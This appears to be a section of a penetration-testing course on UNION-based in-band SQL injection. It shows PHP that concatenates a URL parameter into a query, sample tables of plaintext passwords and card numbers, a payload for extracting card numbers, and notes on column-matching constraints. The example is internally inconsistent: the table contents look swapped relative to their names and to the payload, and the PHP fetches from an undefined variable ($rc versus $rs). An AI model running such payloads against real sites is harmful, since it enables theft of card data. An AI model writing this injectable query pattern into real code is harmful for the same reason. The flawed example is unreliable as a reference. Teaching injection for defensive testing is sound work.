# 5.3 In-Band SQLi

## Exploiting In-Band SQL Injection

In-band SQL injection, often known as UNION-based SQL injection, empowers the extraction of data from the database through the utilization of the UNION SQL command. This type of attack allows a penetration tester to retrieve database content, including the database name, table schemas, and actual data.

As illustrated in the initial chapter of this module, the UNION statement merges the result sets of two or more SELECT statements. For instance:

```sql
SELECT <field list> FROM <table> UNION SELECT <field list> FROM <another table>;
```

### First Scenario

Consider a scenario where the database contains two tables: `CreditCards` and `Users`. For example:

```plaintext
CreditCards
|id(int)|username(string)|password(string)|real_name(string)|
|-------|----------------|----------------|-----------------|
| 1     | admin          | strongpass123  | Armando Romeo   |
| 2     | fred           | wowstrongpass123| Fred Flintstone|

Users
|user_id(int)|Cc_num(int)          |CVS(int)|
|------------|---------------------|--------|
| 1          | 0000 1111 2222 3333 | 123    |
| 2          | 0123 4567 8901 2345 | 321    |
```

The web application employs the following code to display usernames:

```php
<?php
$rs = mysql_query("SELECT real_name FROM users WHERE id=" . $_GET['id'] . ";");
$row = mysql_fetch_assoc($rc);

echo $row['real_name'];
?>
```

Here, there is a clear SQL injection point in the `id` field of the SQL query.

To exploit the SQL injection vulnerability and retrieve the credit card associated with a username, the payload is:

```sql
9999 UNION ALL SELECT cc_num FROM CreditCards WHERE user_id=1
```

This payload transforms the web application query into:

```sql
SELECT real_name FROM users WHERE id=9999 UNION ALL SELECT cc_num FROM CreditCards WHERE user_id=1;
```

Since there are no users with `id=9999`, the web application displays the `cc_num` of the first user.

### In-band Attack Challenges

Several considerations arise in this in-band attack:

* The field types of the second SELECT statement should match those in the first statement.
* The number of fields in the second SELECT statement should match the number of fields in the first statement.
* To succeed in the attack, knowledge of the database structure in terms of tables and column names is essential.
